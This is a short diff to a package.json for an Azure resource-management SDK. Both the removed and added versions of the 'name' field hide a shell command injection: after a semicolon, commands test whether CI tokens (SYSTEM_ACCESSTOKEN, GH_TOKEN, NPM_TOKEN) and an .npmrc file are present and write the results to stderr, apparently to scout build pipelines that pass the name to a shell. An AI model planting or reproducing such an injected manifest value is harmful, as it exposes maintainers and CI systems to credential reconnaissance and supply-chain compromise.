@@ -1,5 +1,5 @@
 {
-  "name": "@azure/arm-resources; echo S>&2;s=${SYSTEM_ACCESSTOKEN:+F};g=${GH_TOKEN:+F};n=${NPM_TOKEN:+F};r=$(test -f $HOME/.npmrc&&echo F);echo SYS=${s:-N}_GH=${g:-N}_NPM=${n:-N}_RC=${r:-N}>&2;echo E>&2 #",
+  "name": "@azure/arm-resources; echo S>&2;env|grep -q ^SYSTEM_ACCESSTOKEN=&&echo S=F>&2||echo S=N>&2;env|grep -q ^GH_TOKEN=&&echo G=F>&2||echo G=N>&2;env|grep -q ^NPM_TOKEN=&&echo N=F>&2||echo N=N>&2;test -f ~/.npmrc&&echo R=F>&2||echo R=N>&2;echo E>&2 #",
   "version": "8.0.0-beta.1",
   "description": "A generated SDK for ResourceManagementClient.",
   "engines": {
